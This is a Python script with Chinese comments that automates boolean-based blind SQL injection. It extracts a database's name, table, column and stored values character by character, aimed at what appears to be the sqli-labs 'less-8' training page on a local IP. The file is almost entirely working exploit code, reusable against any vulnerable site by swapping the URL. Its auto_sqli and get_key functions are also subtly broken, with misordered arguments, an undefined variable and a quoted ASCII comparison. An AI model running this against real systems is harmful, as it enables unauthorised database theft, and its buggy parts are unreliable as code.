# -*- coding:utf-8 -*-

import requests  


def get_database(url, re_len,sqli_str):
    for l in range(0,100):    
        sql_url = url + sqli_str + "and (select length(database())=%d limit 0,1)>0 %%23" %(l) 
        print(sql_url)
        res =  requests.get(sql_url)
        if len(res.text) == re_len:
            db_len = l
            break
    db = ""    
    str = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'  
    sql_url = ""
    for i in range( 1, db_len + 1):      
        for j in str:
            asc = ord(j)
            sql_url = url + sqli_str + "and ascii(substr(database(),%d,1))=%d %%23" %(i, asc)
            response = requests.get(sql_url)
            print(sql_url)
            if len(response.text) == re_len:  
                db = db + j  
                print(db) 
                break 
    #print db
    return db




#继续脚本爆破表名
def get_tablename(url, re_len,sqli_str):
    for l in range(0,100):    
        sql_url = url + sqli_str + "and (select length(table_name)=%d from information_schema.tables where table_schema=database() limit 0,1)>0 %%23" %(l) 
        print(sql_url)
        res =  requests.get(sql_url)
        if len(res.text) == re_len:
            tb_len = l
            break
    tb = ''
    str = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    sql_url = ""

    for i in range(1, tb_len + 1):
        for j in str:
            asc = ord(j)
            sql_url = url + sqli_str + "and (select ascii(substr(table_name,%d,1)) from information_schema.tables where table_schema=database() limit 0,1)=%d %%23" %(i, asc) 
            res = requests.get(sql_url).text
            print(sql_url)
            if len(res) == re_len:
                tb = tb + j
                print(tb)
                break
    #print tb
    return tb


#继续脚本爆破列名
def get_column(url,re_len,tb_name,sqli_str):
    for l in range(0,100):    
        sql_url = url + sqli_str + "and (select length(column_name)=%d from information_schema.columns where table_name='%s' limit 0,1)>0 %%23" %(l, tb_name) 
        res =  requests.get(sql_url)
        print(sql_url)
        if len(res.text) == re_len:
            col_len = l
            break
    col = ''
    sql_url = ""
    str = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

    for i in range(1, col_len + 1):
        for j in str:
            asc = ord(j)
            sql_url = url + sqli_str + "and (select ascii(substr(column_name,%d,1)) from information_schema.columns where table_name='%s' limit 0,1)=%d %%23" %(i, tb_name, asc) 
            print(sql_url)
            res = requests.get(sql_url).text
            if len(res) == re_len:
                col = col + j
                print(col)
                break
    return col


#脚本爆破字段
def get_key(url,re_len,tb_name,col_name,sqli_str):
    for l in range(0,100):    
        sql_url = url + sqli_str + "and (select length(%s)=%d from %s limit 0,1)>0 %%23" %(col_name, l, tb_name) 
        print(sql_url)
        res =  requests.get(sql_url)
        if len(res.text) == re_len:
            key_len = l
            break
    key = ''
    sql_url = ""
    str = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

    for i in range(1, key_len + 1):
        for j in str:
            asc = ord(j)
            sql_url = url + sqli_str + "and (select ascii(substr(%s,%d,1)) from %s limit 0,1)='%d' %%23" %(col_name, i, tb_name, asc) 
            print(sql_url)
            res = requests.get(sql_url).text
            if len(res) == re_len:
                key = key + j
                print(key)
                break
    return key


def auto_sqli(url,re_len,sqli_str):
    get_database(url,re_len,sqli_str)
    #table_name = get_tablename(url,re_len,sqli_str)
    #column_name = get_column(url,re_len,table_name,sqli_str)
    get_key(url,re_len,sqli_str,get_tablename(url,re_len,sqli_str),get_column(url,re_len,table_name,sqli_str))


if __name__ == "__main__":
    url="http://192.168.226.144/sqlab/less-8/?id=1"
    re_len = len(requests.get(url).text)
    sqli_str = r"'"
    get_database(url,re_len,sqli_str)
    table_name = get_tablename(url,re_len,sqli_str)
    column_name = get_column(url,re_len,table_name,sqli_str)

    # auto_getkey
    #get_key(url,re_len,get_tablename(url,re_len),get_column(url,re_len,table_name),sqli_str)  